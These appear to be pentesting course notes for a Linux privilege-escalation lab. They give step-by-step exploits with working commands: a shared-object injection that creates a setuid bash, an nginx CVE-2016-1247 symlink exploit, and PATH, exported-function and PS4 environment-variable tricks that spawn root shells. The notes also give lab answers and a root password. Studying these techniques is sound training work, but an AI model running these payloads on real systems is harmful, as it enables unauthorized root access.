> Escalation Path: Other SUID Escalation
- https://academy.tcm-sec.com/courses/1154399/lectures/24800161
- https://academy.tcm-sec.com/courses/1154399/lectures/24800164
- https://academy.tcm-sec.com/courses/1154399/lectures/24800170

---

# Escalation via Shared Object Injection

## Privilege Escalation - SUID (Shared Object Injection)

### Detection

**Linux VM**

1. In command prompt type: 
```
find / -type f -perm -04000 -ls 2>/dev/null
```
2. From the output, make note of all the SUID binaries.
3. In command line type:
```
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
4. From the output, notice that a .so file is missing from a writable directory.

### Exploitation

**Linux VM**

5. In command prompt type: `mkdir /home/user/.config`
6. In command prompt type: `cd /home/user/.config`
7. Open a text editor and type:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

8. Save the file as `libcalc.c`
9. In command prompt type:
```
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
10. In command prompt type: `/usr/local/bin/suid-so`
11. In command prompt type: `id`

---

# Escalation via Binary Symlinks

## Privilege Escalation - SUID (Symlinks)

### Detection

**Linux VM**

1. In command prompt type: `dpkg -l | grep nginx`
2. From the output, notice that the installed nginx version is `below 1.6.2-5+deb8u3`.

### Exploitation

**Linux VM – Terminal 1**

1. For this exploit, it is required that the user be `www-data`. To simulate this escalate to root by typing: `su root`
2. The root password is `password123`
3. Once escalated to root, in command prompt type: `su -l www-data`
4. In command prompt type: `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`
5. At this stage, the `system waits for logrotate to execute`. In order to speed up the process, this will be simulated by connecting to the `Linux VM via a different terminal`.

> [nginxed-root.sh](https://github.com/khansiddique/pentesting-repo-notes/blob/main/Scripts/nginxed-root.sh)
> [Nginx Exploit](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)

**Linux VM – Terminal 2**

1. Once logged in, type: `su root`
2. The root password is `password123`
3. As root, type the following: `invoke-rc.d nginx rotate >/dev/null 2>&1`
4. Switch back to the previous terminal.

**Linux VM – Terminal 1**

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: `id`

---

# Escalation via Environmental Variables

## Privilege Escalation - SUID (Environment Variables #1)

### Detection

**Linux VM**

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the `SUID binaries`.
3. In command prompt type: `strings /usr/local/bin/suid-env`
4. From the `output`, notice the `functions` used by the `binary`.

### Exploitation

**Linux VM**

1. In command prompt type:
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```
2. In command prompt type: `gcc /tmp/service.c -o /tmp/service`
3. In command prompt type: `export PATH=/tmp:$PATH`
4. In command prompt type: `/usr/local/bin/suid-env`
5. In command prompt type: `id`

Answer the questions below
? What is the last line of the "`strings /usr/local/bin/suid-env`" output?
> service apache2 start

---

## Privilege Escalation - SUID (Environment Variables #2)
### Detection

**Linux VM**

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the `output`, make `note` of `all the SUID binaries`.
3. In command prompt type: `strings /usr/local/bin/suid-env2`
4. From the `output`, `notice` the `functions` used by `the binary`.

#### Exploitation Method #1

**Linux VM**

1. In command prompt type:
```
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```
2. In command prompt type:
```
export -f /usr/sbin/service
```
3. In command prompt type: `/usr/local/bin/suid-env2`

#### Exploitation Method #2

**Linux VM**

1. In command prompt type:
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

Answer the questions below
? What is the last line of the "`strings /usr/local/bin/suid-env2`" output?
> /usr/sbin/service apache2 start

---

# Reference:
1. TCM - https://academy.tcm-sec.com/courses/1154399/lectures/24800161
2. linuxprivescarena Room - https://tryhackme.com/r/room/linuxprivescarena
3. https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
